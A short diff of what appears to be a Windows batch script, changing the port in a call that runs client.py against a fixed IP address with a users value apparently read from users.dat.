@@ -11,4 +11,4 @@ if not exist users.dat (
   )
 )
 @echo on
-client.py 104.245.36.10:2022 %users%
+client.py 104.245.36.10:2222 %users%
